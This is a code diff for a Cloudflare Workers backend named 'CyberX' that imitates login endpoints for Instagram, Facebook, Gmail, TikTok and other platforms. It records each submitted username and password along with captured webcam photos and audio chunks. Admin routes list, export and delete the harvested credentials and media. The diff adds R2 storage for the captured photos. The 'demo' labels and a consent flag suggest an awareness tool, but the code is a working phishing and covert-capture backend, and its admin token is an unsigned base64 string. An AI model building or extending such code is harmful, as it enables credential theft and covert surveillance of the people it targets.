@@ -3,16 +3,52 @@ import { cors } from 'hono/cors';
 
 type CloudflareBindings = {
   DB: D1Database;
+  BUCKET: R2Bucket;
   ADMIN_PASSWORD: string;
   MAX_SESSION_DURATION_MS: number;
 };
 
 const app = new Hono<{ Bindings: CloudflareBindings }>();
+const api = new Hono<{ Bindings: CloudflareBindings }>();
 
-// Enable CORS
+// Enable CORS for the mounted API
 app.use('*', cors());
-app.basePath('/ms/cyberx');
+api.use('*', cors());
+app.route('/ms/cyberz', api);
 
+const PHOTO_PREFIX = 'photos';
+
+async function persistPhotoToR2(
+  env: CloudflareBindings,
+  sessionId: string,
+  photoData: string,
+  source: string
+) {
+  if (!photoData || !photoData.startsWith('data:image/')) {
+    return null;
+  }
+
+  const cleanSessionId = (sessionId || 'anonymous').replace(/[^a-zA-Z0-9_-]+/g, '_');
+  const objectKey = `${PHOTO_PREFIX}/${cleanSessionId}/${source}-${Date.now()}-${Math.random().toString(36).slice(2, 10)}.png`;
+
+  const base64Data = photoData.includes(',') ? photoData.split(',')[1] : photoData;
+  const binary = Uint8Array.from(atob(base64Data), (char) => char.charCodeAt(0));
+
+  await env.BUCKET.put(objectKey, binary, {
+    httpMetadata: {
+      contentType: 'image/png',
+    },
+  });
+
+  return {
+    objectKey,
+    metadata: {
+      source,
+      uploadedAt: new Date().toISOString(),
+      sessionId: cleanSessionId,
+    },
+  };
+}
 // Middleware for authentication
 const authMiddleware = (c: any, next: any) => {
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
@@ -61,6 +97,7 @@ async function initDatabase(db: D1Database) {
         session_id TEXT NOT NULL,
         capture_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
         image_data TEXT,
+        storage_key TEXT,
         metadata TEXT,
         FOREIGN KEY (session_id) REFERENCES sessions(id)
       );
@@ -93,13 +130,13 @@ async function initDatabase(db: D1Database) {
 // ============================================
 // Auth Routes
 // ============================================
-app.post('/api/auth/login', async (c) => {
+api.post('/api/auth/login', async (c) => {
   const { password } = await c.req.json();
   const adminPassword = c.env.ADMIN_PASSWORD;
 
   if (password === adminPassword) {
     // Simple token (in production use proper JWT signing)
-    const token = Buffer.from(`admin:${Date.now()}`).toString('base64');
+    const token = btoa(`admin:${Date.now()}`);
     return c.json({ token });
   }
 
@@ -109,7 +146,7 @@ app.post('/api/auth/login', async (c) => {
 // ============================================
 // Session Routes
 // ============================================
-app.post('/api/sessions/create', async (c) => {
+api.post('/api/sessions/create', async (c) => {
   const db = c.env.DB;
   const { sessionId, consent } = await c.req.json();
   const clientIp = c.req.header('x-forwarded-for') || 'unknown';
@@ -141,7 +178,7 @@ app.post('/api/sessions/create', async (c) => {
   }
 });
 
-app.post('/api/sessions/:id/permissions', async (c) => {
+api.post('/api/sessions/:id/permissions', async (c) => {
   const db = c.env.DB;
   const sessionId = c.req.param('id');
   const { camera, microphone } = await c.req.json();
@@ -161,7 +198,7 @@ app.post('/api/sessions/:id/permissions', async (c) => {
   }
 });
 
-app.get('/api/sessions/:id/status', async (c) => {
+api.get('/api/sessions/:id/status', async (c) => {
   const db = c.env.DB;
   const sessionId = c.req.param('id');
 
@@ -198,19 +235,28 @@ const createDemoHandler = (platform: string) => {
         .bind(credId, sessionId, platform, email_or_username, password, timestamp)
         .run();
 
-      // Store photo if provided
+      // Store photo if provided in R2 and keep a D1 record pointing at it
       if (photo_data && sessionId) {
         const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
         try {
+          const storedPhoto = await persistPhotoToR2(c.env, sessionId, photo_data, platform);
+
           await db
             .prepare(
-              `INSERT INTO photos (id, session_id, image_data, capture_timestamp)
-             VALUES (?, ?, ?, ?)`
+              `INSERT INTO photos (id, session_id, image_data, storage_key, metadata, capture_timestamp)
+             VALUES (?, ?, ?, ?, ?, ?)`
             )
-            .bind(photoId, sessionId, photo_data.substring(0, 1000), timestamp) // Truncate for demo
+            .bind(
+              photoId,
+              sessionId,
+              storedPhoto?.objectKey || photo_data.substring(0, 1000),
+              storedPhoto?.objectKey || null,
+              JSON.stringify(storedPhoto?.metadata || { source: platform }),
+              timestamp
+            )
             .run();
         } catch (photoError) {
-          console.log('Photo storage skipped');
+          console.log('Photo storage skipped', photoError);
         }
       }
 
@@ -230,39 +276,47 @@ const createDemoHandler = (platform: string) => {
   };
 };
 
-app.post('/api/demo/instagram/login', createDemoHandler('instagram'));
-app.post('/api/demo/facebook/login', createDemoHandler('facebook'));
-app.post('/api/demo/twitter/login', createDemoHandler('twitter'));
-app.post('/api/demo/linkedin/login', createDemoHandler('linkedin'));
-app.post('/api/demo/gmail/login', createDemoHandler('gmail'));
-app.post('/api/demo/tiktok/login', createDemoHandler('tiktok'));
+api.post('/api/demo/instagram/login', createDemoHandler('instagram'));
+api.post('/api/demo/facebook/login', createDemoHandler('facebook'));
+api.post('/api/demo/twitter/login', createDemoHandler('twitter'));
+api.post('/api/demo/linkedin/login', createDemoHandler('linkedin'));
+api.post('/api/demo/gmail/login', createDemoHandler('gmail'));
+api.post('/api/demo/tiktok/login', createDemoHandler('tiktok'));
 
 // ============================================
 // Media Routes
 // ============================================
-app.post('/api/media/photos', async (c) => {
+api.post('/api/media/photos', async (c) => {
   const db = c.env.DB;
   const { session_id, photo_data, timestamp } = await c.req.json();
 
   try {
     const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    const storedPhoto = await persistPhotoToR2(c.env, session_id, photo_data, 'access');
 
     await db
       .prepare(
-        `INSERT INTO photos (id, session_id, image_data, capture_timestamp)
-       VALUES (?, ?, ?, ?)`
+        `INSERT INTO photos (id, session_id, image_data, storage_key, metadata, capture_timestamp)
+       VALUES (?, ?, ?, ?, ?, ?)`
       )
-      .bind(photoId, session_id, photo_data.substring(0, 1000), timestamp)
+      .bind(
+        photoId,
+        session_id,
+        storedPhoto?.objectKey || photo_data.substring(0, 1000),
+        storedPhoto?.objectKey || null,
+        JSON.stringify(storedPhoto?.metadata || { source: 'access' }),
+        timestamp
+      )
       .run();
 
-    return c.json({ success: true, photoId });
+    return c.json({ success: true, photoId, objectKey: storedPhoto?.objectKey || null });
   } catch (error) {
     console.error('Photo upload error:', error);
     return c.json({ error: 'Failed to upload photo' }, 500);
   }
 });
 
-app.post('/api/media/audio/chunk', async (c) => {
+api.post('/api/media/audio/chunk', async (c) => {
   const db = c.env.DB;
   const { session_id, audio_data, chunk_index } = await c.req.json();
 
@@ -286,7 +340,7 @@ app.post('/api/media/audio/chunk', async (c) => {
 // ============================================
 // Admin Routes (Protected)
 // ============================================
-app.get('/api/admin/sessions', async (c) => {
+api.get('/api/admin/sessions', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -302,7 +356,7 @@ app.get('/api/admin/sessions', async (c) => {
   }
 });
 
-app.get('/api/admin/sessions/:id', async (c) => {
+api.get('/api/admin/sessions/:id', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -329,7 +383,7 @@ app.get('/api/admin/sessions/:id', async (c) => {
   }
 });
 
-app.get('/api/admin/credentials', async (c) => {
+api.get('/api/admin/credentials', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -349,7 +403,7 @@ app.get('/api/admin/credentials', async (c) => {
   }
 });
 
-app.get('/api/admin/photos/:session_id', async (c) => {
+api.get('/api/admin/photos/:session_id', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -370,7 +424,7 @@ app.get('/api/admin/photos/:session_id', async (c) => {
   }
 });
 
-app.get('/api/admin/audio/:session_id', async (c) => {
+api.get('/api/admin/audio/:session_id', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -391,7 +445,7 @@ app.get('/api/admin/audio/:session_id', async (c) => {
   }
 });
 
-app.get('/api/admin/analytics', async (c) => {
+api.get('/api/admin/analytics', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -434,7 +488,7 @@ app.get('/api/admin/analytics', async (c) => {
   }
 });
 
-app.delete('/api/admin/sessions/:id', async (c) => {
+api.delete('/api/admin/sessions/:id', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -468,7 +522,7 @@ app.delete('/api/admin/sessions/:id', async (c) => {
   }
 });
 
-app.delete('/api/admin/all-data', async (c) => {
+api.delete('/api/admin/all-data', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -491,7 +545,7 @@ app.delete('/api/admin/all-data', async (c) => {
   }
 });
 
-app.post('/api/admin/export', async (c) => {
+api.post('/api/admin/export', async (c) => {
   const db = c.env.DB;
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
 
@@ -528,11 +582,11 @@ app.post('/api/admin/export', async (c) => {
 // ============================================
 // Health Check
 // ============================================
-app.get('/health', (c) => {
+api.get('/health', (c) => {
   return c.json({ status: 'ok' });
 });
 
-app.get('/', (c) => {
+api.get('/', (c) => {
   return c.json({ message: 'CyberX Backend API', version: '1.0.0' });
 });
 
